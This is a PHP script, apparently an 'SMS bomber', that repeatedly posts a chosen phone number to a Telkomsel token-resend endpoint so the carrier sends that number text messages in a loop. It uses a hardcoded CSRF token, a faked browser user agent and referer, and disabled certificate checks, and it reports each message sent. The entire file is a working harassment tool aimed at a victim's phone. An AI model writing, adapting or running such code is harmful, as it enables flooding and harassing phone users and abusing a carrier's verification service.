<?php
function telkbombv2($no, $jum, $wait = 0)
{
    $x      = 1;
    $result = "";
    while ($x <= $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://mobi.telkomsel.com/ulang/token");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "ci_csrf_token=daaac6aa63d46b9709f0e3d054a65c9b&msisdn=" . $no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://mobi.telkomsel.com/ulang?ch=WEB');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec($ch);
        curl_close($ch);
        $json = json_decode($server_output);
        if ($json->status == "1") {
            $result .= $x . ". Success send sms to " . $no . " ✔<br>";
        } else {
            $result .= "✘ FAIL<br>";
        }
        if ($wait != 0) {
            sleep($wait);
        }
        $x++;
    }
    return ($result);
}
$execute = telkbombv2('6282xxxxx', '2');
print $execute;
?>
